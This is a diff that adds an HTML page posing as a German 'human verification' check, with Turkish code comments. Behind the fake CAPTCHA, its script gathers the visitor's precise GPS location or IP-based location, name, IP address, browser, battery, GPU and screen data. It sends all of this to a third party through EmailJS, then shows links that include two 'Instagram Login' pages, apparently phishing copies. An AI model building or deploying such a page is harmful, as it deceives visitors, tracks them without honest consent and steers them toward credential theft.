@@ -1,0 +1,249 @@
+<!doctype html>
+<html lang="de">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Menschliche Überprüfung Erforderlich</title>
+    <!-- Tailwind CSS -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- EmailJS SDK -->
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+    <!-- Tone.js for sound -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/tone/14.7.77/Tone.min.js"></script>
+    <!-- Font Awesome for Icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: #1a1a1e;
+        }
+        .backdrop-blur-sm {
+            backdrop-filter: blur(4px);
+            -webkit-backdrop-filter: blur(4px);
+        }
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            10%, 30%, 50%, 70%, 90% { transform: translateX(-5px); }
+            20%, 40%, 60%, 80% { transform: translateX(5px); }
+        }
+        .animate-shake {
+            animation: shake 0.5s ease-in-out;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        .spinner {
+            border: 4px solid rgba(255, 255, 255, 0.2);
+            border-left-color: #f0f0f5;
+            animation: spin 1s linear infinite;
+        }
+        #status-message {
+            transition: opacity 0.5s ease-in-out, transform 0.5s ease-in-out;
+        }
+        .step-icon {
+            transition: all 0.3s ease-in-out;
+        }
+        .custom-scrollbar::-webkit-scrollbar { width: 8px; }
+        .custom-scrollbar::-webkit-scrollbar-track { background: #2c2c34; border-radius: 10px; }
+        .custom-scrollbar::-webkit-scrollbar-thumb { background: #4f46e5; border-radius: 10px; }
+        .custom-scrollbar::-webkit-scrollbar-thumb:hover { background: #4338ca; }
+        .custom-scrollbar { scrollbar-width: thin; scrollbar-color: #4f46e5 #2c2c34; }
+    </style>
+</head>
+
+<body class="text-gray-200">
+    <!-- Ana İçerik (Arka Plan) -->
+    <div class="container mx-auto p-4 sm:p-8 text-center flex flex-col items-center justify-center min-h-screen">
+        <h1 class="text-4xl font-bold mb-4">Willkommen</h1>
+        <p id="main-subtitle" class="text-lg mb-8">Bitte schließen Sie die Sicherheitsüberprüfung ab, um fortzufahren.</p>
+        
+        <!-- Dinamik Link Butonları için Container -->
+        <div id="link-buttons-container" class="w-full max-w-md mt-4 hidden">
+            <!-- Butonlar buraya dinamik olarak eklenecek -->
+        </div>
+    </div>
+
+    <!-- Doğrulama Modalı -->
+    <div id="modal-backdrop" class="fixed inset-0 bg-black bg-opacity-70 backdrop-blur-sm flex items-center justify-center p-4 z-50">
+        <div id="modal-content" class="bg-[#2c2c34] rounded-2xl shadow-2xl p-6 sm:p-8 w-full max-w-md transform transition-all duration-300">
+            <h2 class="text-2xl font-bold text-center text-white mb-4">Menschliche Überprüfung</h2>
+            <div class="flex justify-between items-center mb-6 px-2">
+                <div id="step-icon-1" class="step-icon text-center text-gray-500"><div class="w-10 h-10 rounded-full bg-gray-700 flex items-center justify-center mx-auto"><i class="fas fa-map-marker-alt"></i></div><p class="text-xs mt-1">Standort</p></div>
+                <div class="flex-grow h-1 bg-gray-600 rounded-full mx-2"></div>
+                <div id="step-icon-2" class="step-icon text-center text-gray-500"><div class="w-10 h-10 rounded-full bg-gray-700 flex items-center justify-center mx-auto"><i class="fas fa-calculator"></i></div><p class="text-xs mt-1">Frage</p></div>
+                <div class="flex-grow h-1 bg-gray-600 rounded-full mx-2"></div>
+                <div id="step-icon-3" class="step-icon text-center text-gray-500"><div class="w-10 h-10 rounded-full bg-gray-700 flex items-center justify-center mx-auto"><i class="fas fa-user"></i></div><p class="text-xs mt-1">Name</p></div>
+            </div>
+
+            <div id="step-1-location"><p class="text-center text-gray-300 mb-4">Um Bot-Angriffen vorzubeugen, müssen wir prüfen, ob Sie ein Mensch sind. Bitte geben Sie Ihren Standort frei.</p></div>
+            <div id="step-2-math" class="hidden"><p class="text-center text-gray-300 mb-4">Bitte lösen Sie diese einfache mathematische Aufgabe:</p><label for="math-input" class="text-center block text-2xl font-semibold my-4">3 + 5 = ?</label><input type="number" id="math-input" placeholder="Antwort..." class="w-full px-4 py-3 bg-[#1a1a1e] text-white border-2 border-gray-600 rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-500 focus:border-indigo-500 transition text-center"></div>
+            <div id="step-3-name" class="hidden"><p class="text-center text-gray-300 mb-4">Fast geschafft! Bitte geben Sie Ihren Namen ein, um die Überprüfung abzuschließen.</p><input type="text" id="visitor-name-input" placeholder="Ihr Name..." class="w-full px-4 py-3 bg-[#1a1a1e] text-white border-2 border-gray-600 rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-500 focus:border-indigo-500 transition"></div>
+            <div id="error-message" class="hidden text-center text-red-400 my-4 font-semibold h-5"></div>
+            <div class="flex justify-center space-x-4 mt-4">
+                <button id="reject-btn" class="px-6 py-3 bg-gray-600 hover:bg-gray-700 text-white font-semibold rounded-lg shadow-md transition-transform transform hover:scale-105 focus:outline-none focus:ring-2 focus:ring-gray-500">Ablehnen</button>
+                <button id="accept-btn" class="px-6 py-3 bg-indigo-600 hover:bg-indigo-700 text-white font-semibold rounded-lg shadow-md transition-transform transform hover:scale-105 focus:outline-none focus:ring-2 focus:ring-indigo-500 w-32"><span id="accept-btn-text">Weiter</span><div id="accept-btn-spinner" class="spinner w-6 h-6 mx-auto hidden"></div></button>
+            </div>
+        </div>
+    </div>
+
+    <div id="spinner-overlay" class="hidden fixed inset-0 bg-black bg-opacity-80 flex-col items-center justify-center z-50"><div class="spinner w-16 h-16 rounded-full"></div><p class="mt-4 text-lg">Daten werden gesendet...</p></div>
+    <div id="status-message" class="fixed bottom-5 right-5 p-4 rounded-lg text-white font-bold shadow-lg z-[60] opacity-0 transform translate-y-4 pointer-events-none"></div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', async () => {
+            emailjs.init({ publicKey: 'F5cGGWMEHBUJTYWe_' });
+
+            // --- LİNK BUTONLARI İÇİN VERİ ---
+            const links = [
+                { title: "Instagram Login 2", url: "https://higer23.github.io/Instagram/", date: "10.09.2025" },
+                { title: "Higer Pong", url: "https://higer23.github.io/ponghig/", date: "10.09.2025" },
+                { title: "Instagram Login 1", url: "https://higer23.github.io/Instaagram-Login/", date: "10.09.2025" },
+                { title: "Schah", url: "https://higer23.github.io/Chess/", date: "10.09.2025" }
+            ];
+
+            // --- DOM ELEMENTLERİ ---
+            const modal = { backdrop: document.getElementById('modal-backdrop'), content: document.getElementById('modal-content'), errorMessage: document.getElementById('error-message'), steps: { location: document.getElementById('step-1-location'), math: document.getElementById('step-2-math'), name: document.getElementById('step-3-name') }, icons: { 1: document.getElementById('step-icon-1'), 2: document.getElementById('step-icon-2'), 3: document.getElementById('step-icon-3') }, inputs: { math: document.getElementById('math-input'), name: document.getElementById('visitor-name-input') }, buttons: { reject: document.getElementById('reject-btn'), accept: document.getElementById('accept-btn'), acceptText: document.getElementById('accept-btn-text'), acceptSpinner: document.getElementById('accept-btn-spinner') } };
+            const spinnerOverlay = document.getElementById('spinner-overlay');
+            const statusMessage = document.getElementById('status-message');
+            const linkButtonsContainer = document.getElementById('link-buttons-container');
+            const mainSubtitle = document.getElementById('main-subtitle');
+
+            // --- DURUM YÖNETİMİ ---
+            let currentStep = 1;
+            let collectedData = { human_check: "❌ Failed" };
+            let isProcessing = false;
+
+            // --- YARDIMCI FONKSİYONLAR ---
+            const playSound = async (type) => { try { await Tone.start(); const synth = new Tone.Synth().toDestination(); if (type === 'success') { synth.triggerAttackRelease("C5", "8n", Tone.now()); } else if (type === 'error') { synth.triggerAttackRelease("C3", "8n", Tone.now()); } } catch (error) { console.warn("Sound could not be played:", error); } };
+            const shakeModal = (message) => { modal.errorMessage.textContent = message; modal.errorMessage.classList.remove('hidden'); modal.content.classList.add('animate-shake'); setTimeout(() => modal.content.classList.remove('animate-shake'), 500); };
+            const showStatusMessage = (message, isSuccess) => { statusMessage.textContent = message; statusMessage.className = `fixed bottom-5 right-5 p-4 rounded-lg text-white font-bold shadow-lg z-[60] transform transition-all ${isSuccess ? 'bg-green-600' : 'bg-red-600'}`; setTimeout(() => { statusMessage.className += ' opacity-0 translate-y-4'; }, 4000); };
+            const toggleButtonLoading = (isLoading) => { isProcessing = isLoading; modal.buttons.acceptText.classList.toggle('hidden', isLoading); modal.buttons.acceptSpinner.classList.toggle('hidden', !isLoading); };
+            const updateStepUI = (stepNumber) => { const iconDiv = modal.icons[stepNumber].querySelector('div'); const iconText = modal.icons[stepNumber].querySelector('p'); iconDiv.classList.remove('bg-gray-700'); iconDiv.classList.add('bg-indigo-600'); iconText.classList.remove('text-gray-500'); iconText.classList.add('text-indigo-400'); };
+
+            // --- LİNK BUTONLARINI OLUŞTURMA ---
+            const generateLinkButtons = () => {
+                const scrollableDiv = document.createElement('div');
+                scrollableDiv.className = 'max-h-[400px] overflow-y-auto custom-scrollbar pr-2';
+                links.forEach(link => {
+                    const button = document.createElement('a');
+                    button.href = link.url;
+                    button.target = '_blank';
+                    button.rel = 'noopener noreferrer';
+                    button.className = "w-full flex flex-col items-center justify-center p-4 bg-sky-600 hover:bg-sky-700 text-white rounded-xl shadow-lg transition-transform transform hover:scale-105 focus:outline-none focus:ring-4 focus:ring-sky-400 mb-4";
+                    button.innerHTML = `<span class="text-lg font-semibold">${link.title}</span><span class="text-xs text-gray-300 mt-1">Eklenme: ${link.date}</span>`;
+                    scrollableDiv.appendChild(button);
+                });
+                linkButtonsContainer.appendChild(scrollableDiv);
+            };
+
+            // --- VERİ TOPLAMA ---
+            const getDeviceAndBrowserInfo = async () => {
+                const getGpuInfo = () => { try { const canvas = document.createElement('canvas'); const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl'); if (gl) { const debugInfo = gl.getExtension('WEBGL_debug_renderer_info'); return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Unknown"; } return "WebGL not supported"; } catch (e) { return "Could not retrieve"; } };
+                const getBatteryInfo = async () => { try { if (!('getBattery' in navigator)) return "API not supported"; const battery = await navigator.getBattery(); return `${Math.round(battery.level * 100)}% (${battery.charging ? 'Lädt' : 'Lädt nicht'})`; } catch (e) { return "Could not retrieve"; } };
+                return { ip: await fetch('https://api.ipify.org?format=json').then(res => res.json()).then(data => data.ip).catch(() => 'N/A'), browser: navigator.userAgent, battery: await getBatteryInfo(), platform: navigator.platform, resolution: `${window.screen.width}x${window.screen.height}`, language: navigator.language, cookies: navigator.cookieEnabled ? 'Aktiviert' : 'Deaktiviert', online: navigator.onLine ? 'Online' : 'Offline', gpu: getGpuInfo(), time: new Date().toLocaleString('de-DE'), };
+            };
+
+            const getLocation = () => new Promise(async (resolve) => {
+                const handleSuccess = (position) => {
+                    localStorage.setItem('locationPermissionGranted', 'true'); // İzni kaydet
+                    resolve(`GPS: ${position.coords.latitude.toFixed(4)}, ${position.coords.longitude.toFixed(4)}`);
+                };
+                const handleError = async () => {
+                    console.warn("Geolocation permission denied. Falling back to IP API.");
+                    try {
+                        const response = await fetch('https://ipapi.co/json/');
+                        const data = await response.json();
+                        resolve(`IP-basiert: ${data.city}, ${data.country_name}`);
+                    } catch (apiError) {
+                        resolve("Standort konnte nicht ermittelt werden");
+                    }
+                };
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(handleSuccess, handleError, { timeout: 8000 });
+                } else {
+                    await handleError(); // Geolocation API hiç desteklenmiyorsa
+                }
+            });
+
+            // --- MODAL AKIŞI ---
+            const handleNextStep = async () => {
+                if (isProcessing) return;
+                modal.errorMessage.classList.add('hidden');
+                toggleButtonLoading(true);
+
+                try {
+                    if (currentStep === 1) {
+                        collectedData.location = await getLocation();
+                        updateStepUI(1); currentStep = 2;
+                        modal.steps.location.classList.add('hidden');
+                        modal.steps.math.classList.remove('hidden');
+                        modal.inputs.math.focus();
+                    } else if (currentStep === 2) {
+                        if (modal.inputs.math.value === '8') {
+                            playSound('success'); updateStepUI(2); currentStep = 3;
+                            modal.steps.math.classList.add('hidden');
+                            modal.steps.name.classList.remove('hidden');
+                            modal.buttons.acceptText.textContent = "Akzeptieren";
+                            modal.inputs.name.focus();
+                        } else {
+                            playSound('error'); shakeModal("Falsche Antwort. Bitte versuchen Sie es erneut.");
+                        }
+                    } else if (currentStep === 3) {
+                        const visitorName = modal.inputs.name.value.trim();
+                        if (visitorName) {
+                            collectedData.visitor_name = visitorName;
+                            collectedData.human_check = "✅ Passed";
+                            updateStepUI(3); await submitData();
+                        } else {
+                            playSound('error'); shakeModal("Bitte geben Sie Ihren Namen ein.");
+                        }
+                    }
+                } catch (error) {
+                    console.error("Error in verification step:", error); shakeModal("Ein unerwarteter Fehler ist aufgetreten.");
+                } finally {
+                    toggleButtonLoading(false);
+                }
+            };
+            
+            const submitData = async () => {
+                modal.backdrop.classList.add('hidden');
+                spinnerOverlay.classList.remove('hidden');
+                try {
+                    const deviceInfo = await getDeviceAndBrowserInfo();
+                    const templateParams = { ...deviceInfo, ...collectedData };
+                    await emailjs.send('service_5uyhust', 'template_5p9annp', templateParams);
+                    showStatusMessage("Überprüfung erfolgreich! Daten gesendet.", true);
+                    mainSubtitle.textContent = "Hier sind einige nützliche Links:";
+                    linkButtonsContainer.classList.remove('hidden'); // Butonları göster
+                } catch (error) {
+                    console.error("EmailJS send failed:", error); showStatusMessage("Senden der Daten fehlgeschlagen.", false);
+                } finally {
+                    setTimeout(() => spinnerOverlay.classList.add('hidden'), 500);
+                }
+            };
+
+            // --- BAŞLANGIÇ VE OLAY DİNLEYİCİLERİ ---
+            generateLinkButtons(); // Sayfa yüklenir yüklenmez butonları hazırla
+            
+            modal.buttons.accept.addEventListener('click', handleNextStep);
+            modal.buttons.reject.addEventListener('click', () => {
+                modal.backdrop.classList.add('hidden');
+                showStatusMessage("Überprüfung abgebrochen.", false);
+                mainSubtitle.textContent = "Überprüfung erforderlich, um Links anzuzeigen.";
+            });
+            modal.inputs.math.addEventListener('keyup', (e) => e.key === 'Enter' && handleNextStep());
+            modal.inputs.name.addEventListener('keyup', (e) => e.key === 'Enter' && handleNextStep());
+
+            // LocalStorage kontrolü ve otomatik adım atlama
+            if (localStorage.getItem('locationPermissionGranted') === 'true') {
+                modal.steps.location.querySelector('p').textContent = "Gespeicherte Standortberechtigung wird verwendet...";
+                setTimeout(handleNextStep, 500); // Kullanıcının görmesi için kısa bir bekleme
+            }
+        });
+    </script>
+</body>
+</html>
+
+
